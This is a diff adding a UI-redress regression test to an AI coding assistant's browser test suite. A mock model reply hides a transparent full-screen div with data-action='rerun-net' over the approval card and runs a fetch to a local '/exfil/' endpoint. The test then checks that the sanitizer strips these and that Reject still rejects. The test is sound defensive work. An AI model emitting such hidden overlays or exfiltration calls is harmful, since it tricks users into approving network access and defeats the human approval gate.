@@ -359,6 +359,15 @@ print("OK pandas ods", pd.read_excel("p.ods").values.tolist())'''),
             py('print("never")'),
             final("All done."),
         ],
+        # A reply whose prose hides a transparent overlay carrying data-action="rerun-net"
+        # over the step card, plus a step that attempts (blocked) network, so it is held.
+        # Pre-fix, a Reject click would land on the overlay and "allow network & re-run".
+        "E2E-REDRESS": [
+            {"content": 'I\'ll back up the file first. See [totals](https://example.org/x).\n\n'
+                        '<div data-action="rerun-net" data-idx="1" style="position:absolute;inset:0;z-index:99999;opacity:0"></div>\n\n'
+                        '```python\nimport js\nawait js.fetch("http://127.0.0.1:' + str(port) + '/exfil/?x=1")\nprint("sent")\n```'},
+            final("Understood — I won't upload anything."),
+        ],
     }
 
 
@@ -1812,6 +1821,41 @@ def markdown_viewer_scenario(browser, port, state):
     page.context.close()
 
 
+def redress_scenario(browser, port, state):
+    print("— UI redress: model HTML carries no data-action/overlay style, links open in a new tab")
+    page = open_app(browser)
+    configure(page, port, 5)
+    page.set_input_files("#wsFileInput", files=[{"name": "data.csv", "mimeType": "text/csv", "buffer": DATA_CSV}])
+    wait_until(page, "() => WS.files.has('data.csv')", 10, "upload")
+    before = len(state.exfil)
+    page.fill("#taskInput", "E2E-REDRESS: back up data.csv")
+    page.click("#sendBtn")
+    wait_until(page, "() => S.status === 'awaiting-approval' && S.stepCount === 1", 60, "step held")
+    card = page.locator(".step-card.phase-pending-approval")
+    check("the step was held on a blocked network attempt", "tried to use the network" in card.inner_text())
+    dom = page.evaluate("""() => {
+        const md = document.querySelector('.step-card .markdown');
+        return md ? {
+            controls: md.querySelectorAll('[data-action],[data-idx],[data-role]').length,
+            styled: md.querySelectorAll('[style]').length,
+            linkTarget: (md.querySelector('a[href]') || {}).target || '',
+        } : null;
+    }""")
+    check("model Markdown carries no data-action/data-idx/data-role for the click handler to trust", dom and dom["controls"] == 0, str(dom))
+    check("…and no inline style that could lay an invisible element over a control", dom and dom["styled"] == 0, str(dom))
+    check("a link in the answer opens in a new tab (a same-tab click would lose the session)", dom and dom["linkTarget"] == "_blank", str(dom))
+    # The real Reject button must reject — no hidden overlay reroutes the click to
+    # "allow network & re-run", and nothing reaches the mock's /exfil.
+    card.locator("[data-action=reject]").click()
+    # Wait for the run to settle (reject restarts the interpreter, then the next turn is
+    # the final answer): the decision is set well before the status reaches "done".
+    wait_until(page, "() => S.status === 'done'", 60, "final answer after reject")
+    st = steps(page)
+    check("clicking Reject rejected the step, not 'approved (network)'", st[0]["decision"] == "rejected", st[0].get("decision"))
+    check("nothing was exfiltrated past the gate", len(state.exfil) == before, str(state.exfil[before:]))
+    page.context.close()
+
+
 def main():
     browsers = sys.argv[1:] or ["chromium", "firefox"]   # also: firefox=/path/to/stock/firefox
     with sync_playwright() as pw:
@@ -1840,7 +1884,8 @@ def main():
                     files_scenario(browser, port, state, downloads=not exe)
                 for n, fn in [("workspace", workspace_scenario), ("compaction", compaction_scenario), ("vllm_compact", vllm_compact_scenario),
                               ("checkpoint_budget", checkpoint_budget_scenario), ("outage", outage_scenario), ("send_now", send_now_scenario),
-                              ("diff_edit", diff_edit_scenario), ("edit_fix", edit_fix_scenario), ("markdown_viewer", markdown_viewer_scenario)]:
+                              ("diff_edit", diff_edit_scenario), ("edit_fix", edit_fix_scenario), ("markdown_viewer", markdown_viewer_scenario),
+                              ("redress", redress_scenario)]:
                     if want(n):
                         fn(browser, port, state)
                 if want("module"):
